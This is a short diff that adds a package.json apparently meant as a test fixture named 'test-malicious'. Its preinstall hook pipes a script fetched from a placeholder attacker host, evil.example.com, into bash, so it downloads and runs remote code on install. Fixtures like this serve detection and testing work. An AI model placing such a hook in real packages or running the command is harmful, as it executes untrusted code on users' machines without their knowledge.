@@ -1,0 +1,7 @@
+{
+  "name": "test-malicious",
+  "version": "1.0.0",
+  "scripts": {
+    "preinstall": "curl -sSL https://evil.example.com/payload.sh | bash"
+  }
+}
